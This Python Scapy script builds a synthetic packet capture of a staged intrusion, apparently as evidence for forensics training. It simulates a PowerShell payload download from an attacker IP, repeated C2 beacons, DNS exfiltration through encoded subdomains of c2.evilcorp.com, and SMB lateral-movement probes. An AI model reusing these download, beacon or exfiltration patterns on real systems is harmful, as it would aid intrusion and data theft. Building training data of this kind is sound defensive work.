from scapy.all import *
import random
import struct

# Attack scenario timeline:
# T+0  Excel macro fires -> PowerShell download cradle
# T+5  Fake svchost establishes C2 beacon (HTTP every 60s)
# T+10 DNS exfiltration begins (encoded subdomains)
# T+15 Lateral movement attempt via SMB

ATTACKER_IP = "185.220.101.45"   # Known Tor exit node IP
VICTIM_IP   = "10.10.10.11"      # Win11-Client
INTERNAL_1  = "10.10.10.20"      # SIFT (lateral movement target)
DOMAIN      = "c2.evilcorp.com"

packets = []
base_time = 1745000000.0

def pkt(src, dst, sport, dport, payload, t_offset):
    return IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA") / Raw(load=payload)

# --- Phase 1: PowerShell download cradle (T+0) ---
ps_payload = (
    "GET /payload.ps1 HTTP/1.1\r\n"
    f"Host: {ATTACKER_IP}\r\n"
    "User-Agent: PowerShell/5.1\r\n\r\n"
)
packets.append(pkt(VICTIM_IP, ATTACKER_IP, 49200, 80, ps_payload, 0))

# --- Phase 2: C2 HTTP beacon every 60 seconds (T+5 to T+605) ---
for i in range(10):
    beacon = (
        f"POST /beacon HTTP/1.1\r\n"
        f"Host: {ATTACKER_IP}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        f"Content-Length: 16\r\n\r\n"
        f"id=WIN11&seq={i:04d}"
    )
    packets.append(pkt(VICTIM_IP, ATTACKER_IP, 49201+i, 443, beacon, 300 + i*60))

# --- Phase 3: DNS exfiltration (T+610) ---
exfil_chunks = [
    "a3f2c1d4e5b6.c2.evilcorp.com",
    "7g8h9i0j1k2l.c2.evilcorp.com",
    "m3n4o5p6q7r8.c2.evilcorp.com",
    "s9t0u1v2w3x4.c2.evilcorp.com",
    "y5z6a7b8c9d0.c2.evilcorp.com",
]
for i, chunk in enumerate(exfil_chunks):
    dns_pkt = (
        IP(src=VICTIM_IP, dst="8.8.8.8") /
        UDP(sport=54321, dport=53) /
        DNS(rd=1, qd=DNSQR(qname=chunk))
    )
    packets.append(dns_pkt)

# --- Phase 4: Lateral movement SMB (T+900) ---
smb_payload = (
    "\x00\x00\x00\x85"  # NetBIOS
    "\xffSMB"           # SMB magic
    "\x72"              # Negotiate Protocol
    "\x00" * 100
)
packets.append(pkt(VICTIM_IP, INTERNAL_1, 49300, 445, smb_payload, 900))
packets.append(pkt(VICTIM_IP, "10.10.10.30", 49301, 445, smb_payload, 905))

# Write PCAP
output = "/home/sansforensics/evidence.pcap"
wrpcap(output, packets)
print(f"[+] PCAP written: {output}")
print(f"[+] Total packets: {len(packets)}")
print(f"[+] Phases: PowerShell download, C2 beacon x10, DNS exfil x5, SMB lateral x2")
